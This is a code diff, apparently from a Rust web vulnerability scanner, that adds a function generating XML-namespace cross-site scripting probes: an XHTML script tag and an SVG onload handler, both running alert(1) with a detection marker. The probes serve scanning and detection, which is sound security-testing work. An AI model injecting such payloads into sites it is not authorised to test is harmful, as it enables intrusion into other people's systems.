@@ -415,6 +415,25 @@ pub(crate) fn get_dom_payloads(
     }
     Ok(payloads)
 }
+
+/// Minimal well-formed XML payloads that activate an explicit browser
+/// namespace. These are used only after discovery observes a reflected value
+/// in an XML response whose current document has no active namespace.
+pub(crate) fn get_xml_namespace_payloads(content_type: &str) -> Vec<String> {
+    let marker = crate::scanning::markers::class_marker();
+    let xhtml_script = format!(
+        "<script xmlns=\"http://www.w3.org/1999/xhtml\" class=\"{marker}\">alert(1)</script>"
+    );
+    let svg_handler = format!(
+        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\" class=\"{marker}\"/>"
+    );
+    if crate::utils::content_type_primary(content_type).as_deref() == Some("image/svg+xml") {
+        vec![svg_handler, xhtml_script]
+    } else {
+        vec![xhtml_script, svg_handler]
+    }
+}
+
 pub(crate) fn get_dom_payloads_for_context(
     param: &Param,
     args: &ScanArgs,
